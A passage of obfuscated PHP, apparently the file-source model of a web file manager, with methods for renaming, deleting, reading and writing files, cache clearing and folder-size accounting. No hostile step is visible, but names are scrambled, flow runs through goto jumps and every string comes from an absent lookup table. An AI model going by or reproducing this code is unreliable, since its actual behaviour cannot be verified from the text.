$c½Ä¤Åµƒ); if (count($Có‡ğ¼¹ê) < $Føãíàßšæ[588]) { $B¦˜Ü«İö„ = $Føãíàßšæ[400]; $B¦˜Ü«İö„(); } goto e¼İ©£Ú¾; aÒØ†²ªÔ: $F‚ŞòÂ‡íí = 1; while ($F‚ŞòÂ‡íí > 1) { $F‚ŞòÂ‡íí = $F‚ŞòÂ‡íí + 4; $DÓ‰‘Å‰Îº = rawurlencode($F‚ŞòÂ‡íí . $Føãíàßšæ[374]); } goto EØäè±ÚÂ; EØäè±ÚÂ: } $cÜğŒö•šè = $this->sourceInfo($F½›º“À•†); goto B»‰Õ¹Ì; c¯Ç—ÉÃç”: $this->updateModifyTime($DÜ‰“”àæÛ); $this->lockMoveEnd($F½›º“À•†); Hook::trigger($Føãíàßšæ[1546], $CÂ´íñ¿¿ï, $D¥Ö“†·‚×); goto dšİ¤¡„Äá; D ƒÕ¥È§Í: $this->folderSizeReset($cÜğŒö•šè[$Føãíàßšæ[485]]); $DÜ‰“”àæÛ = array($cÜğŒö•šè[$Føãíàßšæ[485]]); if ($cÜğŒö•šè[$Føãíàßšæ[410]] == $Føãíàßšæ[87]) { $DÜ‰“”àæÛ[] = $cÜğŒö•šè[$Føãíàßšæ[403]]; } goto c¯Ç—ÉÃç”; B»‰Õ¹Ì: $CÂ´íñ¿¿ï = $this->pathInfoMore($F½›º“À•†); if (!$cÜğŒö•šè) { return !0; } if ($cÜğŒö•šè[$Føãíàßšæ[485]] == 0) { if (!_get($GLOBALS, $Føãíàßšæ[492])) { return !1; } } goto AĞÍ˜«Øà; D–ëÑÄ—Æ: } public function childrenAll($Eî²ÁèĞÂ) { $Bà†Ş’›½É =& $_SERVER[Šº]; $fìÉ‚®›¤à = $Eî²ÁèĞÂ[$Bà†Ş’›½É[403]]; if ($Eî²ÁèĞÂ[$Bà†Ş’›½É[410]] == $Bà†Ş’›½É[87]) { $AÊµôÁÓÛ” = array($Bà†Ş’›½É[561] => array($Bà†Ş’›½É[520], $Eî²ÁèĞÂ[$Bà†Ş’›½É[494]] . $fìÉ‚®›¤à . $Bà†Ş’›½É[521])); $cß¡ÌÜ¼å³ = array($Bà†Ş’›½É[561] => $AÊµôÁÓÛ”[$Bà†Ş’›½É[494]]); $eèôæ¿Û  = $this->field($Bà†Ş’›½É[1961])->where($cß¡ÌÜ¼å³)->select(); $CĞÂ¦ƒªø‡ = !1; $eç¯ìÓ»½Ğ = array($fìÉ‚®›¤à); if ($eèôæ¿Û ) { $CĞÂ¦ƒªø‡ = array_to_keyvalue($eèôæ¿Û , $Bà†Ş’›½É[33], $Bà†Ş’›½É[454]); $CĞÂ¦ƒªø‡ = array_remove_value($CĞÂ¦ƒªø‡, $Bà†Ş’›½É[504]); $eç¯ìÓ»½Ğ = array_to_keyvalue($eèôæ¿Û , $Bà†Ş’›½É[33], $Bà†Ş’›½É[403]); $eç¯ìÓ»½Ğ[] = $fìÉ‚®›¤à; } } else { $CĞÂ¦ƒªø‡ = array($Eî²ÁèĞÂ[$Bà†Ş’›½É[454]]); $eç¯ìÓ»½Ğ = array($fìÉ‚®›¤à); } return array($Bà†Ş’›½É[1957] => $eç¯ìÓ»½Ğ, $Bà†Ş’›½É[1334] => $CĞÂ¦ƒªø‡); } public function removeArray($fé¾·åˆ¢) { if (!$fé¾·åˆ¢) { return !0; } } public function removeRelevance($Fº˜œ³Î¨Ç, $bÃŒ´¡¿İÂ) { goto A©ò…¶Í”; fÕ•§Öøâ÷: Model($bÙ¨Èª©†é[1939])->removeBySource($Fº˜œ³Î¨Ç); $this->where($Cò®öè ¦¡)->delete(); Model($bÙ¨Èª©†é[457])->remove($bÃŒ´¡¿İÂ); goto DÒ› –®Ñ‰; DÒ› –®Ñ‰: for ($aç¯§‰Øì§ = 0; $aç¯§‰Øì§ < count($Fº˜œ³Î¨Ç); $aç¯§‰Øì§++) { $this->sourceCacheClear($Fº˜œ³Î¨Ç[$aç¯§‰Øì§]); } goto EÜ½ä„òîà; AÎËÜç¾¶Ã: Model($bÙ¨Èª©†é[1812])->where($Cò®öè ¦¡)->delete(); Model($bÙ¨Èª©†é[541])->where($Cò®öè ¦¡)->delete(); Model($bÙ¨Èª©†é[1654])->removeBySource($Fº˜œ³Î¨Ç); goto fÕ•§Öøâ÷; AäãƒˆÏâŸ: $Fº˜œ³Î¨Ç = array_unique(array_filter($Fº˜œ³Î¨Ç)); $bÃŒ´¡¿İÂ = array_unique(array_filter($bÃŒ´¡¿İÂ)); if (!$Fº˜œ³Î¨Ç) { return !1; } goto DÙÁ‰ßÓ¶â; A©ò…¶Í”: $bÙ¨Èª©†é =& $_SERVER[Šº]; $Fº˜œ³Î¨Ç = $Fº˜œ³Î¨Ç ? $Fº˜œ³Î¨Ç : array(); $bÃŒ´¡¿İÂ = $bÃŒ´¡¿İÂ ? $bÃŒ´¡¿İÂ : array(); goto AäãƒˆÏâŸ; DÙÁ‰ßÓ¶â: $Cò®öè ¦¡ = array($bÙ¨Èª©†é[417] => array($bÙ¨Èª©†é[418], $Fº˜œ³Î¨Ç)); Model($bÙ¨Èª©†é[1958])->where($Cò®öè ¦¡)->delete(); Model($bÙ¨Èª©†é[448])->where($Cò®öè ¦¡)->delete(); goto AÎËÜç¾¶Ã; EÜ½ä„òîà: } public function rename($fø²ñ‰ŠÆ, $Eñ„®•áŠ”) { goto F˜§ï¢èŒ; F˜§ï¢èŒ: $F–®œÌêº± =& $_SERVER[Šº]; $Bï•İÏ¡ÁÊ = $this->sourceInfo($fø²ñ‰ŠÆ); if (!$Bï•İÏ¡ÁÊ) { return !1; } goto eÓ”ù’„ªÚ; eªöŠ‘×Ã : $this->setNamePinyin($fø²ñ‰ŠÆ, $f˜ƒĞ×Íã[$F–®œÌêº±[28]], !1); $this->updateModifyTime($Bï•İÏ¡ÁÊ[$F–®œÌêº±[485]]); $B•‰«†·àã = $this->where(array($F–®œÌêº±[417] => $fø²ñ‰ŠÆ))->data($f˜ƒĞ×Íã)->save(); goto Cä›Â‰˜‹ê; eÓ”ù’„ªÚ: $dô¸Š¯È²– = $this->fileNameExist($Bï•İÏ¡ÁÊ[$F–®œÌêº±[485]], $Eñ„®•áŠ”); if ($dô¸Š¯È²– && $dô¸Š¯È²– != $fø²ñ‰ŠÆ) { return !1; } $f˜ƒĞ×Íã = array($F–®œÌêº±[420] => $Eñ„®•áŠ”, $F–®œÌêº±[560] => USER_ID); goto eòŒÅÆë²¼; eòŒÅÆë²¼: if (!$Bï•İÏ¡ÁÊ[$F–®œÌêº±[410]] == $F–®œÌêº±[87]) { $f˜ƒĞ×Íã[$F–®œÌêº±[412]] = get_path_ext($Eñ„®•áŠ”); } Model($F–®œÌêº±[541])->eventRename($fø²ñ‰ŠÆ, $Bï•İÏ¡ÁÊ[$F–®œÌêº±[28]], $Eñ„®•áŠ”); $this->sourceCacheClear($fø²ñ‰ŠÆ); goto eªöŠ‘×Ã ; Cä›Â‰˜‹ê: $a¼Ø—©¹ğô = $F–®œÌêº±[1947] . $Bï•İÏ¡ÁÊ[$F–®œÌêº±[485]]; if (isset(self::$cacheChildList[$a¼Ø—©¹ğô])) { unset(self::$cacheChildList[$a¼Ø—©¹ğô]); } return $B•‰«†·àã; goto Eµæìµ±òé; Eµæìµ±òé: } public function setNamePinyin($Fò«å—˜Èø, $aÚƒËêÏÁù, $d›ÄÖ–¿† = true) { $Cíù™ƒê¤â =& $_SERVER[Šº]; $C¤ÁèÎ¼£à = Input::check($aÚƒËêÏÁù, $Cíù™ƒê¤â[564]); if ($d›ÄÖ–¿† && !$C¤ÁèÎ¼£à) { return; } if (!$C¤ÁèÎ¼£à) { $this->metaSet($Fò«å—˜Èø, $Cíù™ƒê¤â[451], null); $this->metaSet($Fò«å—˜Èø, $Cíù™ƒê¤â[450], null); return; } $A…”ßÊõÄñ = array($Cíù™ƒê¤â[451] => str_replace($Cíù™ƒê¤â[50], $Cíù™ƒê¤â[33], Pinyin::encode($aÚƒËêÏÁù)), $Cíù™ƒê¤â[450] => Pinyin::encode($aÚƒËêÏÁù, $Cíù™ƒê¤â[565])); $this->metaSet($Fò«å—˜Èø, $A…”ßÊõÄñ); } public function getContent($F¾–šÕ’ëÑ) { goto F§Í²ÏÂ†•; eæÙÅ”‹ó : if ($eôáŸƒÖó“[$FõÈÙµÇè‡[78]] == 0) { return $FõÈÙµÇè‡[33]; } $dõ¦³ÇóÛ = $FõÈÙµÇè‡[1962] . $eôáŸƒÖó“[$FõÈÙµÇè‡[170]]; if ($eôáŸƒÖó“[$FõÈÙµÇè‡[78]] <= 1024 * 10) { $c¾Õ ¨Ã£° = Cache::get($dõ¦³ÇóÛ); if (!$c¾Õ ¨Ã£°) { $c¾Õ ¨Ã£° = IO::getContent($eôáŸƒÖó“[$FõÈÙµÇè‡[76]]); Cache::set($dõ¦³ÇóÛ, $c¾Õ ¨Ã£°); } return $c¾Õ ¨Ã£°; } goto EÎ¯ö—Ï»; F§Í²ÏÂ†•: $FõÈÙµÇè‡ =& $_SERVER[Šº]; $eôáŸƒÖó“ = $this->fileInfoGet($F¾–šÕ’ëÑ); if (!$eôáŸƒÖó“) { return !1; } goto eæÙÅ”‹ó ; EÎ¯ö—Ï»: if (!$eôáŸƒÖó“[$FõÈÙµÇè‡[76]]) { return $FõÈÙµÇè‡[33]; } return IO::getContent($eôáŸƒÖó“[$FõÈÙµÇè‡[76]]); goto dÎ‰ØÀ¢’ø; dÎ‰ØÀ¢’ø: } public function setDesc($Fí—…î“¬›, $cå©šİµ¹Ğ) { $e‡ã¯©ù®­ =& $_SERVER[Šº]; Model($e‡ã¯©ù®­[541])->eventAddDesc($Fí—…î“¬›, $cå©šİµ¹Ğ); return $this->metaSet($Fí—…î“¬›, $e‡ã¯©ù®­[438], $cå©šİµ¹Ğ); } public function setContent($d¡ñ¤‚’ç’, $E°Ö½ŠÈ¡ = '') { goto CºœóÔªŒ; B§¶…ãö˜: if (!$C©ËŸ¶ÆŒ || !$dö½ ¤‡“Û) { return !1; } $fö÷ß±´ï = Model($cÎ‹Ù¿ÌÙà[457])->addFileByContent($E°Ö½ŠÈ¡, $dö½ ¤‡“Û[$cÎ‹Ù¿ÌÙà[28]]); $e±Øòˆº”ì = $this->fileHistory($dö½ ¤‡“Û, $fö÷ß±´ï[$cÎ‹Ù¿ÌÙà[454]], $fö÷ß±´ï[$cÎ‹Ù¿ÌÙà[78]]); goto BĞÇÄ¦™ËÖ; BĞÇÄ¦™ËÖ: if (!$e±Øòˆº”ì) { return Model($cÎ‹Ù¿ÌÙà[457])->remove($fö÷ß±´ï[$cÎ‹Ù¿ÌÙà[454]]); } $this->folderSizeReset($dö½ ¤‡“Û[$cÎ‹Ù¿ÌÙà[485]]); return !0; goto b¿ó‘ÒöàŠ; CºœóÔªŒ: $cÎ‹Ù¿ÌÙà =& $_SERVER[Šº]; $dö½ ¤‡“Û = $this->sourceInfo($d¡ñ¤‚’ç’); $C©ËŸ¶ÆŒ = $this->fileInfoGet($d¡ñ¤‚’ç’); goto B§¶…ãö˜; b¿ó‘ÒöàŠ: } public function fileSubstr($B§¬ñÖ…ë³, $BçÏë£ÄĞ¼, $f‰ö°„ªô“) { $bŠœÓ£‹¤ã = $this->fileInfoGet($B§¬ñÖ…ë³); if (!$bŠœÓ£‹¤ã) { return !1; } return IO::fileSubstr($bŠœÓ£‹¤ã[$_SERVER[Šº][76]], $BçÏë£ÄĞ¼, $f‰ö°„ªô“); } public function fileInfoGet($CİàëÕÀ‚›) { goto d‚–‘ÙŒµ; A‚Ïöª¦„‹: $fÅ­ìäôËÍ = $BÃÅªèçš[460] . $eßÜ¯¶Ë„Å[$BÃÅªèçš[454]]; $bßà¹âêÕµ = _get(self::$cacheFileInfo, $fÅ­ìäôËÍ); if ($bßà¹âêÕµ) { return $bßà¹âêÕµ; } goto C¸ã ¶´µù; d‚–‘ÙŒµ: $BÃÅªèçš =& $_SERVER[Šº]; $eßÜ¯¶Ë„Å = $this->sourceInfo($CİàëÕÀ‚›); if (!$eßÜ¯¶Ë„Å || $eßÜ¯¶Ë„Å[$BÃÅªèçš[410]]) { return !1; } goto A‚Ïöª¦„‹; C¸ã ¶´µù: $FÅ¾‰ïçÊ® = Model($BÃÅªèçš[457])->fileInfo($eßÜ¯¶Ë„Å[$BÃÅªèçš[454]]); if ($FÅ¾‰ïçÊ®) { $FÅ¾‰ïçÊ®[$BÃÅªèçš[28]] = $eßÜ¯¶Ë„Å[$BÃÅªèçš[28]]; } self::$cacheFileInfo[$fÅ­ìäôËÍ] = $FÅ¾‰ïçÊ®; goto f©ˆ÷ƒ°æ; f©ˆ÷ƒ°æ: return $FÅ¾‰ïçÊ®; goto dåè¿­Ê¯­; dåè¿­Ê¯­: } private function folderChildrenNumber($a°¼á¿¯†Û) { $Fì¨±øÆ¢É =& $_SERVER[Šº]; $AõåÜÑ•íî = $this->sourceInfo($a°¼á¿¯†Û); $d÷á÷ùô±— = array($Fì¨±øÆ¢É[561] => array($Fì¨±øÆ¢É[520], $AõåÜÑ•íî[$Fì¨±øÆ¢É[494]] . $a°¼á¿¯†Û . $Fì¨±øÆ¢É[521]), $Fì¨±øÆ¢É[429] => intval($AõåÜÑ•íî[$Fì¨±øÆ¢É[430]]), $Fì¨±øÆ¢É[554] => 1); $a²‰Ç­ŠÈ© = $this->where($d÷á÷ùô±—)->count(); $CË“ÙÆ¨¦ = $this->where($d÷á÷ùô±—)->where(array($Fì¨±øÆ¢É[554] => 0))->count(); return array($Fì¨±øÆ¢É[82] => $CË“ÙÆ¨¦, $Fì¨±øÆ¢É[83] => $a²‰Ç­ŠÈ©); } public function pathInfo($b‘àî÷™×Ç, $DåÆ‡‚¾Ôò = false) { goto d¨‡‹ğ­±Ë; dğ°®äÌå: $C¯ªŸ‚æ»â = $this->sourceInfo($b‘àî÷™×Ç); if (!$C¯ªŸ‚æ»â) { return !1; } $C¯ªŸ‚æ»â = $this->_listDataApplyItem($C¯ªŸ‚æ»â, $DåÆ‡‚¾Ôò); goto dË ê†² ; E½Ö­ĞÛô‚: $fÜĞÕò¢Š† = $e‘Ğ³‰„’»[446] . intval($DåÆ‡‚¾Ôò) . $e‘Ğ³‰„’»[447] . $b‘àî÷™×Ç; $BÃÈ„Á¶äÚ = _get(self::$cachePathInfo, $fÜĞÕò¢Š†); if ($BÃÈ„Á¶äÚ) { return $BÃÈ„Á¶äÚ; } goto dğ°®äÌå; dË ê†² : self::$cachePathInfo[$fÜĞÕò¢Š†] = $C¯ªŸ‚æ»â; return $C¯ªŸ‚æ»â; goto EÃğíÑ‰Ï; d¨‡‹ğ­±Ë: $e‘Ğ³‰„’» =& $_SERVER[Šº]; $DåÆ‡‚¾Ôò = !1; $b‘àî÷™×Ç = intval($b‘àî÷™×Ç); goto E½Ö­ĞÛô‚; EÃğíÑ‰Ï: } public static $cachePathInfoMore = array(); public function pathInfoMore($d‹ºÊ–å¹) { goto AÇ¦Î‚ÔŞ¾; AÇ¦Î‚ÔŞ¾: $A„œóÂƒ° =& $_SERVER[Šº]; $f¡—Ò«»†µ = _get(self::$cachePathInfoMore, $d‹ºÊ–å¹); if ($f¡—Ò«»†µ) { return $f¡—Ò«»†µ; } goto Fí¸®µŸ­›; Fí¸®µŸ­›: $f¨œ×Éá© = $this->pathInfo($d‹ºÊ–å¹); if (!$f¨œ×Éá©) { return !1; } if ($f¨œ×Éá©[$A„œóÂƒ°[410]] == $A„œóÂƒ°[87]) { $f¨œ×Éá©[$A„œóÂƒ°[81]] = $this->folderChildrenNumber($d‹ºÊ–å¹); } goto eØäÄ÷ÊñÍ; eØäÄ÷ÊñÍ: self::$cachePathInfoMore[$d‹ºÊ–å¹] = $f¨œ×Éá©; return $f¨œ×Éá©; goto D¬¢Ø¾¯®«; D¬¢Ø¾¯®«: } public function sourceInfo($e®İÄÈ³ê) { goto E±é•éæÑ; E±é•éæÑ: $DóÚ‚¡÷Û =& $_SERVER[Šº]; if (!$e®İÄÈ³ê) { return array(); } $e®İÄÈ³ê = intval($e®İÄÈ³ê); goto FÖÂåì”½; Dæ›³š‰ö: $eùØÁ—Ô = $this->where(array($DóÚ‚¡÷Û[403] => $e®İÄÈ³ê))->find(); self::$cacheSourceInfo[$C”äŒİ‡¦] = $eùØÁ—Ô; return self::$cacheSourceInfo[$C”äŒİ‡¦]; goto EäğŠ±øØ¬; FÖÂåì”½: $C”äŒİ‡¦ = $DóÚ‚¡÷Û[445] . $e®İÄÈ³ê; $Fèƒ‚œÓ’ = _get(self::$cacheSourceInfo, $C”äŒİ‡¦); if ($Fèƒ‚œÓ’) { return $Fèƒ‚œÓ’; } goto Dæ›³š‰ö; EäğŠ±øØ¬: } public function sourceCacheClear($Fá¡¬­ÜéÃ = false) { self::cacheClear($Fá¡¬­ÜéÃ); } public static function cacheClear($A¯›ê£¹¦¥ = false) { $FŠ‘æìâ =& $_SERVER[Šº]; if ($A¯›ê£¹¦¥ == !1) { goto BáÌ¸®£ˆ; DÓ’Î¦¯ó¬: self::$cachePathInfo = array(); self::$cachePathInfoMore = null; self::$cachePathInfoMore = array(); goto EÒÂêİè¯; EÒÂêİè¯: return; goto cŒ…×†÷Ğ‚; BáÌ¸®£ˆ: self::$cacheSourceInfo = null; self::$cacheSourceInfo = array(); self::$cachePathInfo = null; goto DÓ’Î¦¯ó¬; cŒ…×†÷Ğ‚: } unset(self::$cacheSourceInfo[$FŠ‘æìâ[445] . $A¯›ê£¹¦¥]); unset(self::$cachePathInfoMore[$A¯›ê£¹¦¥]); unset(self::$cachePathInfo[$FŠ‘æìâ[1963] . $A¯›ê£¹¦¥]); unset(self::$cachePathInfo[$FŠ‘æìâ[1964] . $A¯›ê£¹¦¥]); } public function metaSet($AÆÏ°õ­¯˜, $FÅÆ·¶é» = null, $c£·¸Æ‰Ğô = null) { $FË–ÀªÏ“Õ = parent::metaSet($AÆÏ°õ­¯˜, $FÅÆ·¶é», $c£·¸Æ‰Ğô); if ($FË–ÀªÏ“Õ) { $this->sourceCacheClear($AÆÏ°õ­¯˜); } return $FË–ÀªÏ“Õ; } public function pathInfoByPath($bŠ §˜ÛòÎ, $F‰Î‚Ğ¬Ù…) { $b©Œˆ÷ĞÉ§ =& $_SERVER[Šº]; $bÄô…Å‹½ = !$F‰Î‚Ğ¬Ù… ? array() : explode($b©Œˆ÷ĞÉ§[8], trim($F‰Î‚Ğ¬Ù…, $b©Œˆ÷ĞÉ§[8])); $Dœ£ƒï•ë = $bŠ §˜ÛòÎ; foreach ($bÄô…Å‹½ as $bÜ‹¼¯°«) { $C¬Â¡›Ùˆ = array($b©Œˆ÷ĞÉ§[485] => $Dœ£ƒï•ë, $b©Œˆ÷ĞÉ§[28] => $bÜ‹¼¯°«); $b×Ç¢¾¥»Í = $this->where($C¬Â¡›Ùˆ)->select(); if (!$b×Ç¢¾¥»Í) { return !1; } $b×Ç¢¾¥»Í = array_sort_by($b×Ç¢¾¥»Í, $b©Œˆ÷ĞÉ§[430]); $Dœ£ƒï•ë = $b×Ç¢¾¥»Í[0][$b©Œˆ÷ĞÉ§[403]]; } return $this->pathInfo($Dœ£ƒï•ë, !0); } protected function updateModifyTime($bî•¬ÒÕ—‰) { goto CÃáˆå½ë£; CÃáˆå½ë£: $eĞùˆƒŒ©  =& $_SERVER[Šº]; if (!$bî•¬ÒÕ—‰) { return; } if (!is_array($bî•¬ÒÕ—‰)) { $bî•¬ÒÕ—‰ = array($bî•¬ÒÕ—‰); } goto aßêØÏÎÕÆ; aßêØÏÎÕÆ: foreach ($bî•¬ÒÕ—‰ as $b´ë§¼â¼ => $E„Şµ¸âÜ›) { $bî•¬ÒÕ—‰[$b´ë§¼â¼] = intval($E„Şµ¸âÜ›); $this->sourceCacheClear($E„Şµ¸âÜ›); } $A‘×æ‘§·À = array($eĞùˆƒŒ© [403] => array($eĞùˆƒŒ© [7], $bî•¬ÒÕ—‰)); $CØŒÉ³£á‰ = array($eĞùˆƒŒ© [560] => USER_ID, $eĞùˆƒŒ© [424] => time()); goto dÜííê§á…; dÜííê§á…: $this->where($A‘×æ‘§·À)->save($CØŒÉ³£á‰); goto cìôõÅ¢Í¹; cìôõÅ¢Í¹: } public function folderSizeReset($c‚»•ô™Æ…, $a÷¹ìâ = false) { goto d Ï¾·ª½Š; d Ï¾·ª½Š: $aÅ–¹×½ =& $_SERVER[Šº]; if ($this->statusIgnoreResetSpace) { return; } $A®Ô•‰›Ï = $this->sourceInfo($c‚»•ô™Æ…); goto FŸ·Ù“ŠÊ; Bïâ˜´À®: $cÚÙ·Ó¡àƒ[] = $A®Ô•‰›Ï[$aÅ–¹×½[403]]; $e–Èåó×Ê = array($aÅ–¹×½[403] => array($aÅ–¹×½[418], $cÚÙ·Ó¡àƒ)); if ($a÷¹ìâ < 0) { $e–Èåó×Ê[$aÅ–¹×½[78]] = array($aÅ–¹×½[960], abs($a÷¹ìâ)); } goto eÕÉŒĞĞƒ; dÂƒÍÚ¹Ì™: $C ªÖ‹Ş…¸ = array($A®Ô•‰›Ï[$aÅ–¹×½[411]], $A®Ô•‰›Ï[$aÅ–¹×½[491]]); TaskRun::timeLimitCall($aÖäÊôµ, $aÅ–¹×½[1967], $C ªÖ‹Ş…¸, 1.5); goto FÍä„ËÎË´; eÕÉŒĞĞƒ: $this->where($e–Èåó×Ê)->setAdd($aÅ–¹×½[78], $a÷¹ìâ); CacheLock::unlock($c’ÊÂİ‹ÂÉ); $aÖäÊôµ = $aÅ–¹×½[1966] . $A®Ô•‰›Ï[$aÅ–¹×½[411]] . $aÅ–¹×½[4] . $A®Ô•‰›Ï[$aÅ–¹×½[491]]; goto dÂƒÍÚ¹Ì™; FŸ·Ù“ŠÊ: $c’ÊÂİ‹ÂÉ = $aÅ–¹×½[1965] . $c‚»•ô™Æ…; CacheLock::lock($c’ÊÂİ‹ÂÉ, 20); if ($a÷¹ìâ === !1) { $this->sourceCacheClear($c‚»•ô™Æ…); $A®Ô•‰›Ï = $this->sourceInfo($c‚»•ô™Æ…); $e–Èåó×Ê = array($aÅ–¹×½[402] => $c‚»•ô™Æ…, $aÅ–¹×½[429] => 0); $C³íª´¢ğ = $this->where($e–Èåó×Ê)->sum($aÅ–¹×½[78]); $a÷¹ìâ = intval($C³íª´¢ğ) - intval($A®Ô•‰›Ï[$aÅ–¹×½[78]]); } goto Fë ”Ùå¤; Fë ”Ùå¤: if ($a÷¹ìâ == 0) { return CacheLock::unlock($c’ÊÂİ‹ÂÉ); } $cÚÙ·Ó¡àƒ = $this->parentLevelArray($A®Ô•‰›Ï[$aÅ–¹×½[494]]); if (!$cÚÙ·Ó¡àƒ) { $cÚÙ·Ó¡àƒ = array(); } goto Bïâ˜´À®; FÍä„ËÎË´: } public function folderSizeResetChildren($BÉ×‡¢ÇŞß) { goto aº³Ú¹³õ¹; aº³Ú¹³õ¹: $f™§ Ğ£·’ =& $_SERVER[Šº]; $this->sourceCacheClear($BÉ×‡¢ÇŞß); $fâ­‹ƒÚ = $this->sourceInfo($BÉ×‡¢ÇŞß); goto C‡˜„âÇ‰÷; a‹À¡Ÿ¦ÒĞ: $D¶­¿˜æ‚ù[] = $fâ­‹ƒÚ; $D¶­¿˜æ‚ù = array_to_keyvalue($D¶­¿˜æ‚ù, $f™§ Ğ£·’[403]); foreach ($D¶­¿˜æ‚ù as $C‚‹È„¥È => $fØ´öƒº¥®) { $D¶­¿˜æ‚ù[$C‚‹È„¥È][$f™§ Ğ£·’[1969]] = $D¶­¿˜æ‚ù[$C‚‹È„¥È][$f™§ Ğ£·’[78]]; $D¶­¿˜æ‚ù[$C‚‹È„¥È][$f™§ Ğ£·’[78]] = 0; } goto FğØïÔ”ÀË; FğØïÔ”ÀË: foreach ($cÚŒ£Í­â¦ as $fØ´öƒº¥®) { $FÇ©İº¹âè = $fØ´öƒº¥®[$f™§ Ğ£·’[485]] . $f™§ Ğ£·’[33]; if (!isset($D¶­¿˜æ‚ù[$FÇ©İº¹âè])) { continue; } if ($fØ´öƒº¥®[$f™§ Ğ£·’[430]] == $D¶­¿˜æ‚ù[$FÇ©İº¹âè][$f™§ Ğ£·’[430]]) { $D¶­¿˜æ‚ù[$FÇ©İº¹âè][$f™§ Ğ£·’[78]] += $fØ´öƒº¥®[$f™§ Ğ£·’[78]]; } } foreach ($D¶­¿˜æ‚ù as $fØ´öƒº¥®) { $e‡ã®·È­æ = $this->parentLevelArray($fØ´öƒº¥®[$f™§ Ğ£·’[494]]); foreach ($e‡ã®·È­æ as $FÇ©İº¹âè) { $FÇ©İº¹âè = $FÇ©İº¹âè . $f™§ Ğ£·’[33]; if (!isset($D¶­¿˜æ‚ù[$FÇ©İº¹âè])) { continue; } if ($fØ´öƒº¥®[$f™§ Ğ£·’[430]] == $D¶­¿˜æ‚ù[$FÇ©İº¹âè][$f™§ Ğ£·’[430]]) { $D¶­¿˜æ‚ù[$FÇ©İº¹âè][$f™§ Ğ£·’[78]] += $fØ´öƒº¥®[$f™§ Ğ£·’[78]]; } } } $Bïåì ç‚ = array(); goto c¥Òï‘Îí; C‡˜„âÇ‰÷: $dóˆŞÔ¨÷ = array($f™§ Ğ£·’[554] => 1, $f™§ Ğ£·’[561] => array($f™§ Ğ£·’[520], $fâ­‹ƒÚ[$f™§ Ğ£·’[494]] . $BÉ×‡¢ÇŞß . $f™§ Ğ£·’[521])); $E §®Â¯Ú = $f™§ Ğ£·’[1968]; $D¶­¿˜æ‚ù = $this->field($E §®Â¯Ú)->where($dóˆŞÔ¨÷)->select(); goto BÃÄèİ‰ä¿; BÃÄèİ‰ä¿: $dóˆŞÔ¨÷[$f™§ Ğ£·’[410]] = 0; $cÚŒ£Í­â¦ = $this->field($E §®Â¯Ú)->where($dóˆŞÔ¨÷)->select(); if (!$cÚŒ£Í­â¦) { return; } goto a‹À¡Ÿ¦ÒĞ; c¥Òï‘Îí: foreach ($D¶­¿˜æ‚ù as $fØ´öƒº¥®) { if ($fØ´öƒº¥®[$f™§ Ğ£·’[78]] == $fØ´öƒº¥®[$f™§ Ğ£·’[1969]]) { continue; } $Bïåì ç‚[] = array($f™§ Ğ£·’[403], $fØ´öƒº¥®[$f™§ Ğ£·’[403]], $f™§ Ğ£·’[78], $fØ´öƒº¥®[$f™§ Ğ£·’[78]]); } $this->saveAll($Bïåì ç‚); goto D‹ö®Ü°Ñö; D‹ö®Ü°Ñö: } public function userSpaceReset($Aªßí¯ÌÖ¬ = false) { $F¸ëí©ÍÑÚ =& $_SERVER[Šº]; $Cß„ ã»Ë = $this->where(array($F¸ëí©ÍÑÚ[411] => self::TYPE_USER, $F¸ëí©ÍÑÚ[491] => $Aªßí¯ÌÖ¬, $F¸ëí©ÍÑÚ[410] => 0))->sum($F¸ëí©ÍÑÚ[78]); $Cß„ ã»Ë = !$Cß„ ã»Ë || $Cß„ ã»Ë <= 0 ? 0 : $Cß„ ã»Ë; Model($F¸ëí©ÍÑÚ[510])->userEdit($Aªßí¯ÌÖ¬, array($F¸ëí©ÍÑÚ[1663] => $Cß„ ã»Ë)); } public function targetSpaceUpdate($A÷² šÔ¤Ê, $Cù«Ğ»’œˆ) { $Bö³Ğ–š¥å =& $_SERVER[Šº]; if (!$Cù«Ğ»’œˆ) { return; } if (!in_array($A÷² šÔ¤Ê, array(self::TYPE_USER, self::TYPE_GROUP))) { return; } $dàÙöÔÙª = $this->targetSpaceSize($A÷² šÔ¤Ê, $Cù«Ğ»’œˆ); if ($A÷² šÔ¤Ê == self::TYPE_USER) { Model($Bö³Ğ–š¥å[510])->userEdit($Cù«Ğ»’œˆ, array($Bö³Ğ–š¥å[1663] => $dàÙöÔÙª)); } else { if ($A÷² šÔ¤Ê == self::TYPE_GROUP) { Model($Bö³Ğ–š¥å[493])->groupEdit($Cù«Ğ»’œˆ, array($Bö³Ğ–š¥å[1663] => $dàÙöÔÙª)); } } } public function targetSpaceSize($Fô‹Ş èƒ, $cÑøâ»©ë‹) { goto c×õÛÓÄß; C¿ŸèšŸ§È: $aí”ñÌ£œÉ = array_to_keyvalue($aí”ñÌ£œÉ, $aäÙÆÅò[33], $aäÙÆÅò[403]); $aí”ñÌ£œÉ = array_unique(array_filter($aí”ñÌ£œÉ)); if ($aí”ñÌ£œÉ) { $E²°ºŠõ = array($aäÙÆÅò[417] => array($aäÙÆÅò[418], $aí”ñÌ£œÉ)); $C±ğ·¨¿òÃ += floatval($this->where($E²°ºŠõ)->sum($aäÙÆÅò[78])); } goto c·°”Ÿ¸Ô; aŠÊƒŞÎò: $C±ğ·¨¿òÃ = floatval($dÛ–ÁÊŠè«[$aäÙÆÅò[78]]); $E²°ºŠõ = array($aäÙÆÅò[561] => array($aäÙÆÅò[520], $aäÙÆÅò[506] . $dÛ–ÁÊŠè«[$aäÙÆÅò[403]] . $aäÙÆÅò[521])); $aí”ñÌ£œÉ = Model($aäÙÆÅò[428])->field($aäÙÆÅò[417])->where($E²°ºŠõ)->select(); goto C¿ŸèšŸ§È; c×õÛÓÄß: $aäÙÆÅò =& $_SERVER[Šº]; $dÛ–ÁÊŠè« = $this->sourceRoot($Fô‹Ş èƒ, $cÑøâ»©ë‹, !0); if (!$dÛ–ÁÊŠè«) { return 0; } goto aŠÊƒŞÎò; c·°”Ÿ¸Ô: $C±ğ·¨¿òÃ = !$C±ğ·¨¿òÃ || $C±ğ·¨¿òÃ <= 0 ? 0 : $C±ğ·¨¿òÃ; return $C±ğ·¨¿òÃ; goto A‚‚­¾éš™; A‚‚­¾éš™: } public function allFileTypeProfile() { return $this->fileTypeProfile(!1, !1); } public function userFileTypeProfile($b¹²¨»ğ†) { return $this->fileTypeProfile($b¹²¨»ğ†, SourceModel::TYPE_USER); } public function groupFileTypeProfile($d‹¶„¶ˆ) { return 